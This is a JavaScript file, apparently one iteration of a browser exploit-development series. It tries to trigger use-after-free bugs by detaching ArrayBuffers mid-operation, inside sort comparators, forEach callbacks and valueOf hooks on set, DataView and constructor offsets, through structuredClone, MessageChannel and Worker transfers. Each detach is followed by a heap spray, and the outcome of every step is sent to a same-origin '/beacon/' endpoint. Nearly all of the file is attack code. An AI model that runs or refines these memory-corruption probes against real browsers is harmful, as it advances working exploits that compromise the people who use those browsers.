// p213 — ArrayBuffer detach during TypedArray.sort
//
// p212 Test I proved: Uint32Array.sort() does NOT re-check bounds after
// comparator callback. It completed 5120 comparisons after resize(0).
//
// RAB resize isn't exploitable (backing store stays allocated at maxByteLength).
// But if we can DETACH the buffer during the comparator, the sort continues
// reading/writing FREED memory → real UAF.
//
// Detach methods to try:
// A: structuredClone with transfer list
// B: MessageChannel.postMessage with transfer list
// C: Worker.postMessage with transfer list
// D: Detach via structuredClone in forEach callback
// E: Detach via postMessage in Array.from with Proxy length trick
// F: Detach during DataView/TypedArray.set with evil valueOf
// G: Detach via Response/Blob construction (if they transfer)
//
// Beacon prefix: V213-

(function() {
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V213-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  B('BOOT');

  var tests = [];
  var currentTest = 0;

  // ── TEST A: structuredClone transfer during sort ──
  tests.push({name: 'A-CLONE-SORT', run: function(done) {
    var ab = new ArrayBuffer(4096);
    var view = new Uint32Array(ab);
    for (var i = 0; i < view.length; i++) view[i] = (view.length - i) | 0;

    var detached = false;
    var comparisons = 0;
    var postDetachReads = 0;

    try {
      view.sort(function(a, b) {
        comparisons++;
        if (comparisons === 50 && !detached) {
          try {
            var cloned = structuredClone(ab, {transfer: [ab]});
            detached = true;
            B('A-DETACHED-' + cloned.byteLength);

            // Spray to reclaim freed backing store
            for (var g = 0; g < 5000; g++) {
              var spray = new ArrayBuffer(4096);
              var sv = new Uint8Array(spray);
              sv[0] = 0xCC; sv[1] = 0xCC; sv[2] = 0xCC; sv[3] = 0xCC;
            }
            B('A-SPRAYED');
          } catch (e) {
            B('A-DETACH-ERR-' + e.name);
          }
        }
        if (detached) postDetachReads++;
        return a - b;
      });
      B('A-SORT-OK-CMP' + comparisons + '-POST' + postDetachReads);
    } catch (e) {
      B('A-SORT-ERR-' + e.name + '-CMP' + comparisons + '-POST' + postDetachReads);
    }

    // Check if view is detached
    try {
      var val = view[0];
      B('A-VIEW0-' + val);
    } catch (e) {
      B('A-VIEW0-ERR-' + e.name);
    }

    try {
      B('A-BYTELEN-' + ab.byteLength);
    } catch (e) {
      B('A-BYTELEN-ERR-' + e.name);
    }

    done();
  }});

  // ── TEST B: MessageChannel postMessage transfer during sort ──
  tests.push({name: 'B-MSG-SORT', run: function(done) {
    var ab = new ArrayBuffer(4096);
    var view = new Uint32Array(ab);
    for (var i = 0; i < view.length; i++) view[i] = (view.length - i) | 0;

    var ch = new MessageChannel();
    var detached = false;
    var comparisons = 0;
    var postDetachReads = 0;

    ch.port2.onmessage = function(ev) {
      B('B-PORT2-GOT-' + ev.data.byteLength);
    };

    try {
      view.sort(function(a, b) {
        comparisons++;
        if (comparisons === 50 && !detached) {
          try {
            ch.port1.postMessage(ab, [ab]);
            detached = true;
            B('B-TRANSFERRED');

            for (var g = 0; g < 5000; g++) {
              var spray = new ArrayBuffer(4096);
              new Uint8Array(spray).fill(0xDD);
            }
            B('B-SPRAYED');
          } catch (e) {
            B('B-TRANSFER-ERR-' + e.name);
          }
        }
        if (detached) postDetachReads++;
        return a - b;
      });
      B('B-SORT-OK-CMP' + comparisons + '-POST' + postDetachReads);
    } catch (e) {
      B('B-SORT-ERR-' + e.name + '-CMP' + comparisons + '-POST' + postDetachReads);
    }

    try {
      B('B-BYTELEN-' + ab.byteLength);
    } catch (e) {
      B('B-BYTELEN-ERR-' + e.name);
    }

    setTimeout(done, 1000);
  }});

  // ── TEST C: Worker postMessage transfer during sort ──
  tests.push({name: 'C-WORKER-SORT', run: function(done) {
    var ab = new ArrayBuffer(4096);
    var view = new Uint32Array(ab);
    for (var i = 0; i < view.length; i++) view[i] = (view.length - i) | 0;

    var workerCode = 'self.onmessage = function(e) { self.postMessage("got-" + e.data.byteLength); };';
    var workerBlob = new Blob([workerCode], {type: 'application/javascript'});
    var worker = new Worker(URL.createObjectURL(workerBlob));

    var detached = false;
    var comparisons = 0;

    worker.onmessage = function(ev) {
      B('C-WORKER-REPLY-' + ev.data);
    };

    try {
      view.sort(function(a, b) {
        comparisons++;
        if (comparisons === 50 && !detached) {
          try {
            worker.postMessage(ab, [ab]);
            detached = true;
            B('C-WORKER-TRANSFERRED');

            for (var g = 0; g < 5000; g++) {
              var spray = new ArrayBuffer(4096);
              new Uint8Array(spray).fill(0xEE);
            }
          } catch (e) {
            B('C-WORKER-ERR-' + e.name);
          }
        }
        return a - b;
      });
      B('C-SORT-OK-CMP' + comparisons);
    } catch (e) {
      B('C-SORT-ERR-' + e.name + '-CMP' + comparisons);
    }

    try {
      B('C-BYTELEN-' + ab.byteLength);
    } catch (e) {
      B('C-BYTELEN-ERR-' + e.name);
    }

    setTimeout(function() {
      worker.terminate();
      done();
    }, 1000);
  }});

  // ── TEST D: structuredClone transfer during forEach ──
  tests.push({name: 'D-CLONE-FOREACH', run: function(done) {
    var ab = new ArrayBuffer(4096);
    var view = new Uint8Array(ab);
    for (var i = 0; i < view.length; i++) view[i] = i & 0xFF;

    var detached = false;
    var iterations = 0;
    var postDetachReads = 0;

    try {
      view.forEach(function(val, idx) {
        iterations++;
        if (idx === 100 && !detached) {
          try {
            var cloned = structuredClone(ab, {transfer: [ab]});
            detached = true;
            B('D-DETACHED-AT-100');

            for (var g = 0; g < 5000; g++) {
              var spray = new ArrayBuffer(4096);
              new Uint8Array(spray).fill(0xAA);
            }
          } catch (e) {
            B('D-DETACH-ERR-' + e.name);
          }
        }
        if (detached) {
          postDetachReads++;
          // val should be reading from freed/reused memory
          if (postDetachReads <= 5) {
            B('D-POST-' + idx + '-' + val.toString(16));
          }
        }
      });
      B('D-FOREACH-OK-ITER' + iterations + '-POST' + postDetachReads);
    } catch (e) {
      B('D-FOREACH-ERR-' + e.name + '-ITER' + iterations + '-POST' + postDetachReads);
    }

    done();
  }});

  // ── TEST E: Transfer during TypedArray.set with evil source ──
  tests.push({name: 'E-SET-TRANSFER', run: function(done) {
    var dstBuf = new ArrayBuffer(4096);
    var dst = new Uint32Array(dstBuf);

    var srcBuf = new ArrayBuffer(4096);
    var src = new Uint32Array(srcBuf);
    for (var i = 0; i < src.length; i++) src[i] = 0xDEADBEEF;

    // Create evil offset that transfers the destination during valueOf
    var evilOffset = {
      valueOf: function() {
        B('E-VALUEOF');
        try {
          structuredClone(dstBuf, {transfer: [dstBuf]});
          B('E-DST-DETACHED');
          for (var g = 0; g < 5000; g++) {
            var spray = new ArrayBuffer(4096);
            new Uint8Array(spray).fill(0xFF);
          }
          B('E-SPRAYED');
        } catch (e) {
          B('E-DETACH-ERR-' + e.name);
        }
        return 0;
      }
    };

    try {
      dst.set(src, evilOffset);
      B('E-SET-OK');

      // Check dst — should have been written to freed memory
      try {
        var val = dst[0];
        B('E-DST0-' + val.toString(16));
      } catch (e) {
        B('E-DST0-ERR-' + e.name);
      }
    } catch (e) {
      B('E-SET-ERR-' + e.name);
    }

    done();
  }});

  // ── TEST F: Transfer source during TypedArray.set ──
  tests.push({name: 'F-SET-SRC-TRANSFER', run: function(done) {
    var dstBuf = new ArrayBuffer(4096);
    var dst = new Uint32Array(dstBuf);
    dst.fill(0x41414141);

    var srcBuf = new ArrayBuffer(4096);
    var src = new Uint32Array(srcBuf);
    src.fill(0xBEEFCAFE);

    // Transfer the SOURCE buffer during offset valueOf
    var evilOffset = {
      valueOf: function() {
        B('F-VALUEOF');
        try {
          structuredClone(srcBuf, {transfer: [srcBuf]});
          B('F-SRC-DETACHED');
          // Spray over freed source
          for (var g = 0; g < 5000; g++) {
            var spray = new ArrayBuffer(4096);
            new Uint8Array(spray).fill(0x42);
          }
        } catch (e) {
          B('F-DETACH-ERR-' + e.name);
        }
        return 0;
      }
    };

    try {
      dst.set(src, evilOffset);
      B('F-SET-OK');
      // Check what got copied — freed source data or spray?
      B('F-DST0-' + dst[0].toString(16));
      B('F-DST1-' + dst[1].toString(16));
    } catch (e) {
      B('F-SET-ERR-' + e.name);
    }

    done();
  }});

  // ── TEST G: Transfer during TypedArray constructor from arraybuffer ──
  tests.push({name: 'G-CTOR-TRANSFER', run: function(done) {
    var ab = new ArrayBuffer(4096);
    new Uint8Array(ab).fill(0x55);

    // Evil byteOffset that detaches during construction
    var evilByteOffset = {
      valueOf: function() {
        B('G-VALUEOF');
        try {
          structuredClone(ab, {transfer: [ab]});
          B('G-DETACHED-IN-CTOR');
          for (var g = 0; g < 5000; g++) {
            var spray = new ArrayBuffer(4096);
            new Uint8Array(spray).fill(0x77);
          }
        } catch (e) {
          B('G-DETACH-ERR-' + e.name);
        }
        return 0;
      }
    };

    try {
      var view = new Uint8Array(ab, evilByteOffset, 1024);
      B('G-VIEW-LEN-' + view.length);
      B('G-VIEW0-' + view[0].toString(16));
    } catch (e) {
      B('G-VIEW-ERR-' + e.name);
    }

    done();
  }});

  // ── TEST H: Transfer during DataView read via valueOf ──
  tests.push({name: 'H-DV-TRANSFER', run: function(done) {
    var ab = new ArrayBuffer(4096);
    var dv = new DataView(ab);
    new Uint8Array(ab).fill(0x33);

    var evilOffset = {
      valueOf: function() {
        B('H-VALUEOF');
        try {
          structuredClone(ab, {transfer: [ab]});
          B('H-DETACHED');
          for (var g = 0; g < 5000; g++) {
            var spray = new ArrayBuffer(4096);
            new Uint8Array(spray).fill(0x88);
          }
        } catch (e) {
          B('H-DETACH-ERR-' + e.name);
        }
        return 100;
      }
    };

    try {
      var val = dv.getUint32(evilOffset);
      B('H-READ-' + val.toString(16));
    } catch (e) {
      B('H-READ-ERR-' + e.name);
    }

    // Also try setUint32 — write to freed memory
    ab = new ArrayBuffer(4096);
    dv = new DataView(ab);
    var evilOffset2 = {
      valueOf: function() {
        try {
          structuredClone(ab, {transfer: [ab]});
          B('H-WRITE-DETACHED');
          for (var g = 0; g < 5000; g++) {
            new ArrayBuffer(4096);
          }
        } catch (e) {
          B('H-WRITE-DETACH-ERR-' + e.name);
        }
        return 100;
      }
    };

    try {
      dv.setUint32(evilOffset2, 0xDEADBEEF);
      B('H-WRITE-OK');
    } catch (e) {
      B('H-WRITE-ERR-' + e.name);
    }

    done();
  }});

  // ── Run all tests ──
  function runNext() {
    if (currentTest >= tests.length) {
      B('ALL-DONE');
      return;
    }
    var t = tests[currentTest++];
    B(t.name + '-START');
    var completed = false;
    var timeout = setTimeout(function() {
      if (!completed) { completed = true; B(t.name + '-TIMEOUT'); runNext(); }
    }, 15000);
    t.run(function() {
      if (!completed) {
        completed = true;
        clearTimeout(timeout);
        B(t.name + '-END');
        setTimeout(runNext, 500);
      }
    });
  }

  runNext();
})();
